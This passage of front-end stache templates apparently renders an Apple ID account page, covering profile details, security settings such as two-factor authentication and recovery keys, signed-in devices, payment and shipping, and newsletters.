                                    <div class="description" id="appleIDDescription">
                                        Use your Apple ID to sign in to all Apple products and services.
                                    </div>
                                </div>
                                <div class="col-sm-2 section-edit">
                                    <button class="btn btn-link btn-done acdn-btn-done" role="button">Done</button>
                                </div>
                            </div>
                            {{#account.person.primaryEmailAddress.address}}
                                    {{^str_eq account.name . false}}
                                        <div class="row edit-row">
                                            <div class="col-sm-5">
                                                <change-primary-email account="{account}"></change-primary-email>
                                            </div>
                                            <div class="col-sm-5">
                                                    <div class="description" id="primaryEmailDescription">
                                                    This email address will be used to send you notifications about your account.
                                                </div>
                                            </div>
                                        </div>
                                    {{/str_eq}}
                            {{/if}}
                            <div class="row edit-row">
                                <div class="col-sm-5">
                                    <changename account="{account}" config="{config}" birthday-has-errors="{errors.birthday.hasErrors}"
                                                first-name="{{account.person.name.firstName}}"
                                                middle-name="{{account.person.name.middleName}}"
                                                last-name="{{account.person.name.lastName}}"
                                                first-name-pronounce="{{account.person.name.firstNamePronounce}}"
                                                last-name-pronounce="{{account.person.name.lastNamePronounce}}" pending-changes="{pendingChanges}" done-clicked="{doneClicked}"></changename>
                                </div>
                            </div>
                            <div class="row edit-row">
                                <div class="col-sm-5">
                                    <h3 class="section-subtitle" id="birthdayLabel">DATE OF BIRTH</h3>
                                    <div class="form-group">
                                        <div class="pop-wrapper field-pop-wrapper">
                                            <div class="dob-wrapper clearfix">
                                                <date focus-placeholder="{config.localizedResources.dateInputPlaceholder}"
                                                      format="{config.localizedResources.dateInputFormat}"
                                                      classes="form-control form-input {{#if errors.birthday.hasErrors}}has-errors{{/if}} {{#is canEdit.birthday false}}disabled{{/is}}"
                                                      placeholder="date of birth"
                                                input-date="{editableBirthday}"
                                                errors="{errors.birthday}"
                                                {{#is canEdit.birthday false}}disabled="disabled"{{/is}}>
                                                </date>
                                                {{#if errors.birthday.hasErrors}}
                                                    {{#if showBirthdayError}}
                                                        <div id="dobError" class="errorPop-body popover top in" role="group" tabindex="-1">
                                                            <div class="errorPop-arrow arrow" style="left: 50%;"></div>
                                                            <div class="errorPop-content popover-content">
                                                                {{{errors.birthday.main.message}}}
                                                            </div>
                                                        </div>
                                                    {{/if}}
                                                {{/if}}
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-sm-6">
                                    {{^awaitingBirthDateApproval}}
                                        <div class="description correct-birthday-message no-outline" tabindex="-1">
                                            <p id="correctBirthdayMessage">Your correct date of birth is required to enable some Apple services.</p>
                                            {{#unless canEdit.birthday}}
                                            <p id="correctBirthdayMessage">To change the date of birth for this account, please contact Apple Support.</p>
                                            {{/if}}
                                        </div>
                                    {{else}}
                                        <div class="awaiting-birthday-approval-message">
                                            <div class="description no-outline" tabindex="-1">
                                                A request to confirm this date of birth has been sent to {{approver.firstName}} {{approver.lastName}}.
                                            </div>
                                            <button type="button" class="btn btn-link btn-xs cancel-pending-request">
                                                Cancel Request
                                            </button>
                                        </div>
                                    {{/if}}
                                </div>
                            </div>
                            <div class="row edit-row">
                                <div class="col-sm-5">
                                    <reachable account="{account}" config="{config}"></reachable>
                                </div>
                                <div class="col-sm-6">
                                    <div class="description">
                                        Adding contact information helps friends and family reach you using iMessage, FaceTime, Game Center and more.
                                    </div>
                                </div>
                            </div>
                            {{#if config.pageFeatures.featureSwitches.showPrimaryAddress}}
                                {{#if showPrimaryAddress}}
                                    <div class="row edit-row">
                                        <div class="col-sm-5 primary-address">
                                            <primary-address {(account)}="account"
                                                             {(primary-address)}="account.person.primaryAddress"
                                                             {(config)}="config"
                                                             {^is-address-dirty}="../../isPrimaryAddressDirty"
                                                             {^@persist-address}="../../persistPrimaryAddress"></primary-address>
                                        </div>
                                        <div class="col-sm-6">
                                            <p class="description no-outline">
                                                This is the address you provided when you created your Apple ID.
                                            </p>
                                        </div>
                                    </div>
                                {{/if}}
                            {{/if}}
                        </div>
                    {{/unless}}
                </accordion>
            </div>
        </div>
    </div>
</section>

</script>
<script type="text/stache" id="jstache_1865006110">


<section id="securityNonEdit" class="flow-section mobile-only non-edit">
    <div class="row">
        <div class="col-md-3 section-name" id="heading-security">
            <div class="section-action">
                <button class="btn btn-link section-title" aria-controls="security-content">
                    Security
                </button>
            </div>
        </div>
    </div>
</section>
<section id="security" class="flow-section mobile-section-edit {{#editMode}} edit{{else}} non-edit{{/editMode}} {{#animateMobileEditClose}} mobile-edit-close{{/animateMobileEditClose}}">
    <div class="row">
        <div class="col-md-3 section-name" id="heading-security">
            <h2 class="not-mobile section-title break-section-title">
                Security
            </h2>
            {{#editMode}}
                <div class="mobile-only section-title">
                    <button class="btn btn-link btn-overlay btn-back">Back</button>
                    <h2 class="wrap-popover-title">
                        Security
                    </h2>
                    <div class="mobile-only mobile-loading">
                        <loading class="loading-inline" loading="{loadingEdit}"></loading>
                    </div>
                </div>
            {{/editMode}}
            <div class="section-action">
                <button class="btn btn-link section-title" aria-controls="security-content">
                    Security
                </button>
            </div>
        </div>
        <div class="col-md-9 subsection" id="security-content" aria-labelledby="heading-security">
            <accordion edit="{editMode}" delay="0.4">
                {{^editMode}}
                    <div class="security-details">
                        <div class="row">
                            <div class="col-sm-5">
                                <div class="flow-subsection">
                                    <div class="detail">
                                        <changepassword account="{account}" config="{config}" nonedit="true" opened="{pwEnabled}" error="{error}"></changepassword>
                                    </div>
                                </div>
                                {{^is account.type "sa"}}
                                    {{#unless account.person.isUnderAge}}
                                        {{#is account.type "hsa1"}}
                                            <div class="flow-subsection">
                                                <h3 class="section-subtitle" id="secureSignIn">TWO-STEP VERIFICATION</h3>
                                                <div class="secureSignInOn">On</div>
                                            </div>
                                        {{/if}}
                                        {{#is account.type "hsa2"}}
                                            <div class="flow-subsection">
                                                <h3 class="section-subtitle" id="secureSignIn">TWO-FACTOR AUTHENTICATION</h3>
                                                <div class="secureSignInOn">On</div>
                                            </div>
                                        {{/if}}
                                    {{/unless}}
                                {{/is}}
                            </div>
                            <div class="col-sm-5">
                                {{#is account.type "hsa2"}}
                                    <div class="flow-subsection">
                                        <h3 class="section-subtitle">TRUSTED PHONE NUMBERS</h3>
                                        {{#each account.security.phoneNumbers}}
                                            <div class="detail trusted-phone">
                                                <span class="force-ltr">
                                                    {{fullNumberWithCountryPrefix}}
                                                </span>
                                            </div>
                                        {{/each}}
                                    </div>
                                {{/if}}
                                {{#is account.type "sa"}}
                                    <div class="flow-subsection">
                                        <div class="detail">
                                            <changequestions account="{account}" config="{config}" opened="{questionsEnabled}"></changequestions>
                                        </div>
                                    </div>
                                {{/if}}
                                {{#is account.type "basic"}}
                                    <div class="flow-subsection">
                                        <h3 class="section-subtitle">SECURITY QUESTIONS</h3>
                                        <div class="detail">
                                            <button class="btn btn-link btn-questions">Change Questions...</button>
                                        </div>
                                    </div>
                                {{/if}}
                                {{#is account.type "hsa1"}}
                                    <div class="flow-subsection trusted-phones">
                                        <h3 class="section-subtitle">TRUSTED PHONE NUMBERS</h3>
                                        {{#account.security.devices.length}}
                                            {{#filter account.security.devices filters.trustedPhoneNumbersFilter}}
                                                {{#each this}}
                                                    <div class="detail trusted-device {{type}}">
                                                        <span class="force-ltr">
                                                            {{name}}{{#modelName}}<small>({{modelName}})</small>{{/modelName}}
                                                        </span>
                                                    </div>
                                                {{/each}}
                                            {{/filter}}
                                        {{/account.security.devices.length}}
                                    </div>
                                    <div class="flow-subsection trusted-devices">
                                        <h3 class="section-subtitle ">TRUSTED DEVICES</h3>
                                        {{#filter account.security.devices filters.trustedDevicesFilter}}
                                            {{#each this}}
                                                <dl class="inline-dl detail trusted-device nonedit-trusted-devices clearfix force-ltr">
                                                <dt class="info-dt">
                                                  <string-ellipsis content-value="{name}" show-length="18">{{ name }}</string-ellipsis>
                                                </dt>
                                                <dd class="dd">
                                                   {{#modelName}} <small>({{modelName}})</small>{{/modelName}}
                                                </dd>
                                                </dl>
                                            {{/each}}
                                        {{else}}
                                            No Devices Available
                                        {{/filter}}
                                    </div>
                                {{/is}}
                            </div>
                            <div class="col-sm-2 section-edit security-edit">
                                <button class="btn btn-link btn-edit acdn-btn-edit btn-security">Edit</button>
                                <loading loading="{loadingEdit}"></loading>
                            </div>
                        </div>
                        <div class="row security-row">
                            {{#is account.type "sa"}}
                                <div class="col-sm-5">
                                    <div class="flow-subsection">
                                        <rescue-email-view account="{account}" config="{config}"></rescue-email-view>
                                    </div>
                                </div>
                            {{/is}}
                            {{#unless account.person.isUnderAge}}
                                {{#if account.security.isTwoStepVerificationAvailable}}
                                    {{#is account.type "sa"}}
                                    <div class="col-sm-5">
                                        <div class="flow-subsection">
                                            <twostepenroll account="{account}" config="{config}" add-trusted="{addTrusted}"></twostepenroll>
                                        </div>
                                    </div>
                                    {{/is}}

                                    {{#is account.type "basic"}}
                                    <div class="col-sm-8">
                                        <div class="flow-subsection">
                                            <twostepenroll account="{account}" config="{config}" add-trusted="{addTrusted}"></twostepenroll>
                                        </div>
                                    </div>
                                    {{/is}}
                                {{/if}}
                            {{/unless}}
                        </div>
                {{/if}}
                {{#editMode}}
                    <div class="editable security-edit clearfix">
                        <div class="flow-subsection">
                            <div class="row">
                                <div class="col-sm-5">
                                    <changepassword account="{account}" config="{config}" opened="{pwEnabled}" error="{error}"></changepassword>
                                </div>
                                <div class="col-sm-5">
                                    <div class="description" id="passwordDescription">
                                        Last changed {{formatDate account.lastPasswordChangedDatetime "LL" config}}.
                                    </div>
                                </div>
                                <div class="col-sm-2 section-edit">
                                    <button class="btn btn-link btn-done acdn-btn-done" role="button"> Done</button>
                                </div>
                            </div>
                        </div>
                        {{#is account.type "sa"}}
                            <div class="flow-subsection">
                                <div class="row">
                                    <div class="col-sm-5">
                                        <changequestions account="{account}" config="{config}" opened="{questionsEnabled}"></changequestions>
                                    </div>
                                    <div class="col-sm-5">
                                        <div class="description" id="securityQuestionDescription">
                                            These questions are used to verify your identity or to help reset your password.
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="flow-subsection">
                                <div class="row">
                                    <div class="col-sm-5">
                                        <recoveryEmail account="{account}" config="{config}"></recoveryEmail>
                                    </div>
                                    <div class="col-sm-5">
                                        <div class="description">A verified rescue email will allow you to reset your security questions if you ever forget them.
                                        </div>
                                    </div>
                                </div>
                            </div>
                        {{/is}}
                        {{#is account.type "basic"}}
                            <div class="flow-subsection">
                                <div class="row">
                                    <div class="col-sm-5">
                                        <changequestions account="{account}" config="{config}" opened="{questionsEnabled}"></changequestions>
                                    </div>
                                    <div class="col-sm-5">
                                        <div class="description" id="securityQuestionDescription">
                                            These questions are used to verify your identity or to help reset your password.
                                        </div>
                                    </div>
                                </div>
                            </div>
                            {{#if account.security.rescueEmail}}
                                <div class="flow-subsection">
                                    <div class="row">
                                        <div class="col-sm-5">
                                            <recoveryEmail account="{account}" config="{config}"></recoveryEmail>
                                        </div>
                                        <div class="col-sm-5">
                                            <div class="description">A verified rescue email will allow you to reset your security questions if you ever forget them.
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            {{/if}}
                        {{/is}}
                        {{#is account.type "hsa1"}}
                            <div class="flow-subsection trusted-devices-subsection">
                                <div class="row trusted-phone-numbers-row">
                                    <div class="col-sm-5">
                                        <trustedDevices account="{account}" config="{config}" add-trusted="{addTrusted}" loading="{loading}"></trustedDevices>
                                    </div>
                                    <div class="col-sm-5">
                                        <p class="description">
                                            You can use these phone numbers to receive verification codes when signing in.
                                        </p>
                                    </div>
                                </div>
                                <div class="row trusted-devices-row">
                                    <div class="col-sm-5">
                                        <div>
                                            <verifytrusteddevices account="{account}" config="{config}" add-trusted="{addTrusted}" loading="{loading}"></verifytrusteddevices>
                                        </div>
                                    </div>
                                    <div class="col-sm-5">
                                        <p class="description">
                                            You can also receive verification codes using any iOS device with Find My iPhone enabled.
                                        </p>
                                        <p class="description">
                                            {{#unless loading.trustedDevices}}
                                                Do not see your devices? <button class="btn btn-link btn-text-link refresh-devices" role="button">Refresh Devices</button> or <a href="http://support.apple.com/kb/PH2697" target="_blank">Set up Find My iPhone</a>
                                            {{else}}
                                                <loading loading="{loading.trustedDevices}"></loading>
                                                Refreshing...
                                            {{/unless}}
                                        </p>
                                    </div>
                                </div>
                            </div>
                            <div class="flow-subsection">
                                <div class="row">
                                    <div class="col-sm-5">
                                        <changeRecoveryKey account="{account}" config="{config}"></changeRecoveryKey>
                                    </div>
                                    <div class="col-sm-5">
                                        <div class="description">
                                            Your Recovery Key is used to access your account if you forget your password or don't have access to your trusted devices.
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="flow-subsection">
                                <div class="row">
                                    <div class="col-sm-5">
                                        <apppassword account="{account}" config="{config}"{{#appEnabled}} opened="{appEnabled}" action="{action}"{{/if}}>
                                    </div>
                                    <div class="col-sm-5">
                                        <div class="description">
                                            Use an app-specific password when signing in to an app or service not provided by Apple.<a href="https://support.apple.com/HT204397" target="_blank" class="nowrap"> Learn more.</a>
                                            {{#if account.security.hasSecondaryPassword}}
                                                <apppasswordhistory account="{account}" config="{config}" app-passwords-revoked="{appPasswordsRevoked}"></apppasswordhistory>
                                            {{else}}
                                                <div class="mobile-only">
                                                <idms-modal {(show)}="appPasswordsRevoked">
                                                    <div class="popover-body idms-popover-modal-content">
                                                      <div class="row">
                                                        <div class="col-sm-12">
                                                          <div class="mobile-only">
                                                            <h4 class="idms-popover-modal-title">App-specific passwords successfully revoked.</h4>
                                                          </div>
                                                          <div class="details idms-popover-modal-body">
                                                            Any apps using app-specific passwords have been signed out.
                                                          </div>
                                                        </div>
                                                      </div>
                                                    </div>

                                                    <div class="popover-footer aid-footer idms-popover-modal-footer clearfix">
                                                      <div class="btn-group flow-controls pull-right">
                                                        <button type="button" class="btn btn-link last revokeAllOK">OK</button>
                                                      </div>
                                                    </div>
                                                </idms-modal>
                                            {{/if}}
                                        </div>
                                    </div>
                                </div>
                            </div>
                            {{#if account.security.rescueEmail}}
                                <div class="flow-subsection">
                                    <div class="row">
                                        <div class="col-sm-5">
                                            <recoveryEmail account="{account}" config="{config}"></recoveryEmail>
                                        </div>
                                        <div class="col-sm-5">
                                            <div class="description">Apple uses this notification email to send you important account and security related information.
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            {{/if}}
                            <div class="flow-subsection">
                                <twostepunenroll editable-birthday="{editableBirthday}" account="{account}" config="{config}" complete="{notice}" confirm-unenroll="{confirmUnenroll}" {(un-enrolled-attributes)}="unEnrolledAttributes"></twostepunenroll>
                            </div>
                        {{/is}}
                        {{#is account.type "hsa2"}}
                            <div class="flow-subsection">
                                <div class="row">
                                    <div class="col-sm-5">
                                        <trustedPhone account="{account}" config="{config}"></trustedPhone>
                                    </div>
                                    <div class="col-sm-5">
                                        <div class="description">
                                            Trusted phone numbers are used to verify your identity when signing in and to recover your account if you lose access.
                                        </div>
                                    </div>
                                </div>
                            </div>
                        {{/if}}
                        {{#unless account.person.isUnderAge}}
                            {{#if account.security.isTwoStepVerificationAvailable}}
                                {{#is account.type "sa"}}
                                    <div class="flow-subsection">
                                        <div class="row">
                                            <div class="col-sm-5">
                                                <twostepenroll account="{account}" config="{config}" add-trusted="{addTrusted}"></twostepenroll>
                                            </div>
                                            <div class="col-sm-5">
                                                <div class="description" id="twoStepDescription">
                                                    Two-step verification is an additional security feature designed to prevent anyone from accessing your account, even if they have your password.
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                {{/if}}
                                {{#is account.type "basic"}}
                                    <div class="flow-subsection">
                                        <div class="row">
                                            <div class="col-sm-5">
                                                <twostepenroll account="{account}" config="{config}" add-trusted="{addTrusted}"></twostepenroll>
                                            </div>
                                            <div class="col-sm-5">
                                                <div class="description" id="twoStepDescription">
                                                    Two-step verification is an additional security feature designed to prevent anyone from accessing your account, even if they have your password.
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                {{/if}}
                            {{/if}}
                        {{/unless}}
                        {{#is account.type "hsa2"}}
                            <div class="flow-subsection">
                                <div class="row">
                                    <div class="col-sm-5">
                                        <apppassword account="{account}" config="{config}"{{#appEnabled}} opened="{appEnabled}" action="{action}"{{/if}}></apppassword>
                                    </div>
                                    <div class="col-sm-5">
                                        <div class="description">
                                            Use an app-specific password when signing in to an app or service not provided by Apple.<a href="https://support.apple.com/HT204397" target="_blank" class="nowrap"> Learn more.</a>
                                            {{#account.security.hasSecondaryPassword}}
                                                <apppasswordhistory account="{account}" config="{config}"></apppasswordhistory>
                                            {{/account.security.hasSecondaryPassword}}
                                        </div>
                                    </div>
                                </div>
                            </div>
                            {{#if account.security.rescueEmail}}
                                <div class="flow-subsection">
                                    <div class="row">
                                        <div class="col-sm-5">
                                            <recoveryEmail account="{account}" config="{config}"></recoveryEmail>
                                        </div>
                                        <div class="col-sm-5">
                                            <div class="description">Apple uses this notification email to send you important account and security related information.
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            {{/if}}
                            <div class="flow-subsection">
                                <twostepunenroll editable-birthday="{editableBirthday}"
                                    {allow-opt-out}="allowHSAOptOut"
                                    account="{account}" config="{config}" complete="{notice}" confirm-unenroll="{confirmUnenroll}" {(un-enrolled-attributes)}="unEnrolledAttributes"></twostepunenroll>
                            </div>
                                
                        {{/if}}
                    </div>
                {{/if}}
            </accordion>
        </div>
    </div>
</section>
{{#confirmUnenroll}}
    <confirm-unenroll opened="{confirmUnenroll}" account="{account}" {un-enrolled-attributes}="unEnrolledAttributes" ></confirm-unenroll>
{{/confirmUnenroll}}

</script>
<script type="text/stache" id="jstache_508496414">


<section id="devicesNonEdit" class="flow-section mobile-only non-edit clearfix">
    <div class="row">
        <div class="col-md-3 section-name">
            <div class="section-action">
                <button class="btn btn-link section-title" aria-controls="devices-content">
                    Devices
                </button>
            </div>
        </div>
    </div>
</section>

<section id="devices" class="flow-section mobile-section-edit {{#editMode}} edit{{else}} non-edit{{/if}}  {{#animateMobileEditClose}} mobile-edit-close{{/animateMobileEditClose}} clearfix">
    <div class="row">
        <div class="col-md-3 section-name" id="heading-devices">
            <h2 class="not-mobile section-title break-section-title">
                Devices
            </h2>
            {{#editMode}}
                <div class="mobile-only section-title">
                    <button class="btn btn-link btn-overlay btn-back"> Back </button>
                    <h2 class="wrap-popover-title">
                        Devices
                    </h2>
                </div>
            {{/editMode}}
            {{^editMode}}
                <div class="section-action">
                    <button class="btn btn-link section-title" aria-controls="devices-content">
                        Devices
                    </button>
                </div>
            {{/editMode}}
        </div>
        <div class="col-md-9 subsection" id="devices-content" aria-labelledby="heading-devices">
            {{#notChallenged}}
                <div class="flow-subsection">
                    <div class="row">
                        <div class="col-sm-10">
                            <h3 class="section-subtitle">
                                DEVICES
                            </h3>
                            <div class="detail about-devices">
                                <button class="btn btn-link view-devices">
                                    View Details
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            {{else}}
                {{#account.devices.length}}
                    <div class="detail about-devices">
                        You are signed in to the devices below. <a class="more-link" target="_blank" href="https://support.apple.com/HT205064">Learn more <i class="icon icon-text icon_right_chevron"></i></a>
                    </div>
                    <div class="devices-details">
                        <div class="device-wrapper">
                            {{#each account.devices}}
                                <device-details class="device-details-wrapper" device="{.}" account="{account}" devices="{account.devices}" device-items="{deviceItems}"></device-details>
                            {{/each}}
                            <div class="col-sm-2">
                            </div>
                        </div>
                    </div>
                {{else}}
                    <div class="flow-subsection">
                        <h3 class="section-subtitle">
                            DEVICES
                        </h3>
                        <div class="detail about-devices">
                            Devices you sign in to with your Apple ID will appear here. <a class="more-link" target="_blank" href="https://support.apple.com/HT205064">Learn more <i class="icon icon-text icon_right_chevron"></i></a>
                        </div>
                    </div>
                {{/if}}
            {{/notChallenged}}
        </div>
    </div>
</section>


</script>
<script type="text/stache" id="jstache_96561520">



<div id="paymentVerificationContainer"></div>
<section id="paymentNonEdit" class="flow-section mobile-only non-edit clearfix">
    <div class="row">
        <div class="col-md-3 section-name">
            <div id="payment-header" class="section-action">
                <button class="btn btn-link section-title" ($click)="openMobileView()" aria-controls="payment-content">
                    Payment
                </button>
            </div>
        </div>
    </div>
</section>

<section id="payment"
         class="flow-section mobile-section {{#if isSectionOpen}}open{{else}}closed{{/if}} {{#if animateMobileSectionClose}}mobile-edit-close{{/if}}">
    <div class="payment-wrapper">
        <div class="mobile-only">
        {{#if editMode}}
            
            <idms-toolbar cancel-button-text='Back'
                          action-button-text='Save'
                          section-title='Payment'
                          (actionClicked)="saveUpdates"
                          (cancelClicked)="cancelEdit">
            </idms-toolbar>
            {{else}}
            {{#if showViewMode}}
            
            <idms-toolbar cancel-button-text='Back'
                          section-title='Payment'
                          class="mobile-only"
                          (cancelClicked)="closeMobileView">
            </idms-toolbar>
            {{/if}} 

        {{/if}} 
        </div>

        <div class="row">
              <div class="not-mobile col-md-3 section-name">
                <h2 class="section-title break-section-title">
                    Payment & Shipping
                </h2>
            </div>

            {{#unless isPaymentStatusValid}}
            <div class="col-md-9 subsection">
                <div class="payment-details">
                    <div class="row">
                        <div class="col-sm-12">
                            <warning-message error-message="{{paymentErrorMessage}}"></warning-message>
                        </div>
                    </div>
                </div>
            </div>
            {{else}}

            <div class="col-md-9 subsection" id="payment-content">
                <accordion {edit}="editMode" delay="0.4">
                    {{#unless editMode}}
                        {{#if showViewMode}}
                        <div class="row view-mode">
                            {{#if isUnderageWithPayment}}
                                <div class="col-sm-12">
                                    <div class="flow-subsection">
                                        <h3 class="section-subtitle not-mobile">PAYMENT METHOD</h3>
                                        <h3 class="section-subtitle mobile-only">FAMILY CARD</h3>
                                        <family-payment-view {family-payment-method}="account.familyPaymentMethod"
                                                             {family-organizer-name}="account.person.familyOrganizerName">
                                        </family-payment-view>
                                    </div>
                                    <div class="col-sm-12 mobile-only">
                                        <p class="edit-description">This card is shared by {{familyOrganizerName.firstName}} {{familyOrganizerName.lastName}} for iTunes, iBooks, App Store and iCloud storage purchases.</p>
                                    </div>
                                </div>
                            {{else}} 
                            <div class="col-xs-12 col-sm-5">
                                <h3 class="section-subtitle not-mobile">PAYMENT METHOD</h3>
                                {{#if showFamilyPaymentMethod}}
                                <div class="payment-method-view family">
                                    <h3 class="section-subtitle mobile-only">FAMILY CARD</h3>
                                    <family-payment-view {family-payment-method}="account.familyPaymentMethod"
                                                         {family-organizer-name}="account.person.familyOrganizerName">
                                    </family-payment-view>
                                    <div class="col-md-12 mobile-only">
                                        <p class="edit-description">This card is shared by {{familyOrganizerName.firstName}} {{familyOrganizerName.lastName}} for iTunes, iBooks, App Store and iCloud storage purchases.</p>
                                    </div>
                                    <div class="col-xs-12 section-separator mobile-only" aria-hidden="true"></div>
                                </div>
                                {{/if}} 

                                
                                <h3 class="section-subtitle mobile-only">PAYMENT METHOD</h3>
                                <div class="payment-method-view account">
                                {{#if hasOwnPaymentMethod}}
                                    {{#if accountPaymentMethod.card}}
                                    <credit-card-view {credit-card}="accountPaymentMethod"></credit-card-view>
                                    {{else}}
                                    <payment-method-view {has-family-method-non-card}="hasFamilyMethodNonCard"
                                                         {has-family-payment}="showFamilyPaymentMethod"
                                                         {account-payment-method}="accountPaymentMethod">
                                    </payment-method-view>
                                    {{/if}}

                                    {{#if isPaymentMethodEditable}}
                                    <div class="detail">
                                        <button class="btn btn-link edit-card acdn-btn-edit" 
                                            ($click)="openEdit('payment-method')">Edit Payment Information
                                        </button>
                                    </div>
                                    {{/if}}
                                {{else}} 
                                    <div class="detail"><button class="btn btn-link add-card acdn-btn-edit" ($click)="openEdit('payment-method')">Add a Card...</button></div>
                                {{/if}} 
                                    <div class="col-sm-3 col-md-6 mobile-only">
                                        <p class="edit-description">{{paymentMethodDescription}}</p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-xs-12 col-sm-5">
                                {{#if preferredShippingAddress}}
                                    
                                    <div class="col-md-12 section-separator mobile-only" aria-hidden="true"></div>
                                    <shipping-address-view
                                            address-title='SHIPPING ADDRESS'
                                            {address}="preferredShippingAddress"
                                            {address-features}="config.shippingAddressFeatures"
                                            {name-order}="config.pageFeatures.nameOrder"
                                            {(account)}="account"></shipping-address-view>
                                    <div class="detail">
                                        <button class="btn btn-link acdn-btn-edit" ($click)="openEdit('shipping-address')">Edit Shipping Address</button>
                                    </div>
                                {{else}}
                                    <h3 class="section-subtitle">SHIPPING ADDRESS</h3>
                                    <div class="detail">
                                        <button class="btn btn-link acdn-btn-edit add-shipping-address" 
                                            ($click)="openEdit('shipping-address')">
                                            Add a Shipping address...
                                        </button>
                                    </div>
                                {{/if}} 
                                <div class="detail mobile-only">
                                    <p class="edit-description">
                                        The shipping address will be used when you make Apple Store purchases.
                                    </p>
                                </div>
                            </div>
                            {{/if}} 
                        </div>
                        {{/if}} 
                    {{else}} 
                        <div class="payment-edit">
                            <div class="row">
                                <a name="payment-method"></a>
                                <div class="col-sm-10 pull-left">

                                    {{#if showFamilyPaymentMethod}}
                                    <div class="flow-subsection">
                                        <div class="row">
                                            <div class="col-xs-12 col-sm-8 col-md-6">
                                                <div class="flow-subsection">
                                                    <h3 class="section-subtitle">FAMILY CARD</h3>
                                                    <family-payment-view {family-payment-method}="account.familyPaymentMethod"
                                                                         {family-organizer-name}="account.person.familyOrganizerName">
                                                    </family-payment-view>
                                                </div>
                                            </div>

                                            <div class="col-xs-12 col-sm-4 col-md-6">
                                                <p class="edit-description">This card is shared by {{familyOrganizerName.firstName}} {{familyOrganizerName.lastName}} for iTunes, iBooks, App Store and iCloud storage purchases.</p>
                                            </div>
                                        </div>
                                        <div class="col-sm-12 section-separator" aria-hidden="true"></div>
                                    </div>
                                    {{/if}} 
                                    <div class="row">
                                        {{#unless isPaymentMethodEditable}}
                                        <div class="col-xs-12 col-sm-8 col-md-6">
                                            <div class="flow-subsection">
                                                {{#if accountPaymentMethod.card}}
                                                <credit-card-view {credit-card}="accountPaymentMethod"></credit-card-view>
                                                {{else}}
                                                <payment-method-view {has-family-method-non-card}="hasFamilyMethodNonCard"
                                                                     {has-family-payment}="showFamilyPaymentMethod"
                                                                     {account-payment-method}="accountPaymentMethod">
                                                </payment-method-view>
                                                {{/if}}
                                            </div>
                                        </div>
                                        <div class="col-xs-12 col-sm-4 col-md-6">
                                            <p class="edit-description">{{paymentMethodDescription}}</p>
                                        </div>
                                        {{else}} 
                                        <div class="col-xs-12 col-sm-8 col-md-6">
                                            <h3 class="section-subtitle">
                                                {{#if showFamilyPaymentMethod}}
                                                ADDITIONAL PAYMENT METHOD
                                                {{else}}
                                                PAYMENT METHOD
                                                {{/if}}
                                            </h3>
                                            <payment-method-edit {(payment-method)}="paymentMethod"
                                                {payment-method-options}="config.paymentMethodOptions"
                                                {^payment-method-option}="../../paymentMethodOption"
                                                {^@get-payment-method-data}="../../getPaymentMethodData"
                                                {default-country-code}="config.pageFeatures.defaultCountry"
                                                {expiration-date-format}="mm/yyyy"
                                                {^@validate-payment-method}="../../validatePaymentMethod"
                                                {^@validate-address}="../../validateBillingAddress"
                                                use-popover="true"
                                                {^is-billing-address-dirty}="../../isBillingAddressDirty"
                                                {initial-billing-address}="billingAddress"
                                                {^new-billing-address}="../../newBillingAddress"
                                                {^new-address-features}="../../newBillingAddressFeatures"
                                                {(name-on-card)}="nameOnCard"
                                                {(phone-number)}="phoneNumber"
                                                {payment-address-features}="config.paymentAddressFeatures"
                                                {supported-countries}="supportedCountries"
                                                {country-options}="config.localizedResources.countryOptions"
                                                {sms-supported-countries}="smsSupportedCountries"
                                                {page-features}="config.pageFeatures"
                                                {(errors)}="errors">
                                            </payment-method-edit>

                                        </div>
                                        <div class="col-xs-12 col-sm-4">
                                            <p class="edit-description">{{paymentMethodDescription}}</p>
                                        </div>
                                        {{/if}} 
                                    </div>
                                    <div class="col-sm-12 section-separator" aria-hidden="true"></div>
                                    <div class="row">
                                        <a name="shipping-address"></a>
                                        <div class="shipping-address">
                                            <div class="col-xs-12 col-sm-8 col-md-6">
                                                <shipping-address {(account)}="account"
                                                                  {(config)}="config"
                                                                  {^new-shipping-address}="shippingAddress"
                                                                  {(initial-shipping-address)}="preferredShippingAddress"
                                                                  {initial-billing-address}="billingAddress"
                                                                  {^is-shipping-address-dirty}="../../isShippingAddressDirty"
                                                                  {^@persist-address}="../../persistShippingAddress">
                                                </shipping-address>
                                            </div>
                                            <div class="col-xs-12 col-sm-4 col-md-6">
                                                <p class="edit-description">
                                                    The shipping address will be used when you make Apple Store purchases.
                                                </p>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-sm-2 push-right section-edit not-mobile">
                                    {{#if saving}}
                                    <div class="saving">
                                        <span class="spinner-span"></span> Saving...
                                    </div>
                                    {{else}}
                                    <button class="btn btn-link btn-cancel acdn-btn-done"
                                            role="button"
                                            ($click)="cancelEdit()">Cancel</button>
                                    <button class="btn btn-link btn-done save-payment acdn-btn-save"
                                            role="button"
                                            ($click)="saveUpdates()"
                                            {{#unless isSaveEnabled}}disabled{{/unless}}> Save </button>
                                    {{/if}}
                                </div>
                            </div>
                        </div>
                    {{/unless}} 
                </accordion>
            </div>
            {{/unless}}
        </div>
    </div>
</section>


</script>
<script type="text/stache" id="jstache_112331220">


<section id="newslettersNonEdit" class="flow-section newsletters mobile-only non-edit">
    <div class="row">
        {{#unless account.person.isUnderAge}}
            <div class="col-md-3 section-name" id="heading-newsletters">
                <div class="section-action">
                    <button class="btn btn-link section-title" aria-controls="newsletters-content">
                        Newsletters
                    </button>
                </div>
            </div>
        {{/unless}}
    </div>
</section>


<section id="newsletters" class="flow-section mobile-section-edit newsletters{{#editMode}} edit{{else}} non-edit{{/editMode}} {{#animateMobileEditClose}} mobile-edit-close{{/animateMobileEditClose}}">
    <div class="row">
        {{#unless account.person.isUnderAge}}
            <div class="col-md-3 section-name" id="heading-newsletters">
                <h2 class="not-mobile section-title break-section-title">
                    Newsletters
                </h2>
                {{#editMode}}
                    <div class="mobile-only section-title">
                        <button class="btn btn-link btn-overlay btn-back"> Back </button>
